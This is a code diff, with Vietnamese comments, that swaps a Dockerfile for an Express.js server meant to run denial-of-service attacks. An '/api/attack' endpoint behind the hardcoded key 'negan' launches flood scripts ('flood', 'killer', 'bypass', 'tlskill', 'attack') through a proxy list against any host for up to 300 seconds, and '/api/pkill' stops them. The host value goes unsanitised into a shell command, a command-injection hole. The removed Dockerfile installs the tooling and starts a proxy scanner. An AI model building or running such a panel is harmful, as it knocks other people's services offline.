@@ -1,39 +1,141 @@
-# Sử dụng official Ubuntu minimal base image
-FROM ubuntu:20.04
+const express = require("express");
+const { exec } = require("child_process");
+const axios = require("axios");
 
-# Set environment variables to avoid interactive prompts during installation
-ENV DEBIAN_FRONTEND=noninteractive
+const app = express();
+const port = 9999;
 
-# Tạo thư mục làm việc
-WORKDIR /api
+const maxConcurrentAttacks = 1;
+let activeAttacks = 0;
 
-# Update and install required packages
-RUN apt update -y && apt install -y --no-install-recommends \
-    bash curl git tmux htop speedtest-cli python3-pip zip screen ca-certificates gnupg lsb-release \
-    && curl -sL https://deb.nodesource.com/setup_20.x | bash - \
-    && apt-get install -y nodejs docker-ce docker-ce-cli containerd.io \
-    && pip3 install requests python-telegram-bot pytz termcolor psutil \
-    && npm install colors set-cookie-parser request axios hpack https commander socks chalk chalk@2 \
-    && npm install express \
-    && apt clean \
-    && rm -rf /var/lib/apt/lists/*
+// Lấy IP công cộng
+const getPublicIP = async () => {
+  try {
+    const { data } = await axios.get('https://api.ipify.org?format=json');
+    return data.ip;
+  } catch (error) {
+    console.error('Không thể lấy IP công cộng:', error);
+    return 'N/A';
+  }
+};
 
-# Thêm Docker key và repo (giữ để minh bạch cài đặt Docker)
-RUN mkdir -p /etc/apt/keyrings && \
-    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg && \
-    echo \
-    "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | \
-    tee /etc/apt/sources.list.d/docker.list > /dev/null
+// Kiểm tra dữ liệu đầu vào
+const validateInput = ({ key, host, time, method, port }) => {
+  if (![key, host, time, method, port].every(Boolean)) return "Thiếu tham số yêu cầu";
+  if (key !== "negan") return "Invalid Key";
+  if (time > 300) return "Thời gian phải nhỏ hơn 300 giây";
+  if (port < 1 || port > 65535) return "Cổng không hợp lệ";
+  if (!["flood", "killer", "bypass", "tlskill", "attack"].includes(method.toLowerCase())) {
+    return "Phương thức không hợp lệ";
+  }
+  return null;
+};
 
-# Copy toàn bộ nội dung từ repository vào container
-COPY . .
+// Thực thi lệnh tấn công
+const executeAttack = (command, clientIP) => {
+  exec(command, (error, stdout, stderr) => {
+    if (stderr) console.error(stderr);
+    console.log(`[${clientIP}] Lệnh [${command}] đã được thực thi thành công.`);
+    activeAttacks--;
+  });
+};
 
-# Expose port 80
-EXPOSE 80
+// Lấy PID của tiến trình
+const getPidsByProcess = (process) => {
+  return new Promise((resolve, reject) => {
+    exec(`pgrep -f ${process}`, (error, stdout, stderr) => {
+      if (stderr || error) reject(stderr || error);
+      resolve(stdout.trim().split("\n"));
+    });
+  });
+};
 
-# Build Docker image và chạy container
-RUN docker build -t image .
-RUN docker run -d -p 80:80 image
+// Dừng tiến trình
+const killProcess = (process) => {
+  return new Promise((resolve, reject) => {
+    exec(`pkill -f -9 ${process}`, (error, stdout, stderr) => {
+      if (stderr || error) reject(stderr || error);
+      console.log(`Đã dừng tiến trình ${process}`);
+      resolve();
+    });
+  });
+};
 
-# Run tất cả các file cần thiết khi container khởi động
-CMD bash -c "node api.js || tail -f /dev/null & python3 prxscan.py -l list.txt || tail -f /dev/null"
+// Xử lý các tiến trình và trả về danh sách PID đã dừng
+const pkillProcesses = async () => {
+  const processes = ["flood", "killer", "bypass", "tlskill", "attack"];
+  let pidList = [];
+
+  for (let process of processes) {
+    try {
+      const pids = await getPidsByProcess(process);
+      pidList.push(...pids);
+      await killProcess(process);
+    } catch (err) {
+      console.error(`Lỗi khi xử lý tiến trình ${process}: ${err}`);
+    }
+  }
+
+  return pidList;
+};
+
+// API tấn công
+app.get("/api/attack", (req, res) => {
+  const { key, host, time, method, port } = req.query;
+  const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+
+  const validationMessage = validateInput({ key, host, time, method, port });
+  if (validationMessage) return res.status(400).json({ status: "error", message: validationMessage });
+
+  if (activeAttacks >= maxConcurrentAttacks) {
+    return res.status(400).json({ status: "error", message: "Đã đạt giới hạn tấn công đồng thời" });
+  }
+
+  activeAttacks++;
+
+  // Tạo lệnh tấn công dựa trên phương thức
+  const commands = {
+    "flood": `node --max-old-space-size=65536 flood ${host} ${time} 10 10 live.txt flood`,
+    "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
+    "bypass": `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`,
+    "tlskill": `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`,
+    "attack": `node --max-old-space-size=65536 attack -m GET -m POST -u ${host} -s ${time} -p live.txt -t 5 -r 300 --ratelimit true --full true`
+  };
+
+  const command = commands[method.toLowerCase()];
+  if (!command) {
+    return res.status(400).json({ status: "error", message: "Phương thức tấn công không hợp lệ" });
+  }
+
+  executeAttack(command, clientIP);
+  res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method });
+});
+
+// API pkill
+app.get("/api/pkill", async (req, res) => {
+  const { pkill } = req.query;
+
+  if (pkill === "true") {
+    try {
+      const pidList = await pkillProcesses();
+      res.status(200).json({
+        status: "success",
+        message: "Đã dừng tất cả các tiến trình tấn công.",
+        pids: pidList.join(", ")
+      });
+    } catch (error) {
+      res.status(500).json({ status: "error", message: "Lỗi khi dừng tiến trình", error });
+    }
+  } else {
+    res.status(400).json({ status: "error", message: "Tham số pkill không hợp lệ." });
+  }
+});
+
+// Khởi động server
+getPublicIP().then((ip) => {
+  app.listen(port, () => {
+    console.log(`[Máy chủ API] đang chạy trên > ${ip}:${port}`);
+  });
+}).catch((err) => {
+  console.error("Không thể lấy IP công cộng:", err);
+});
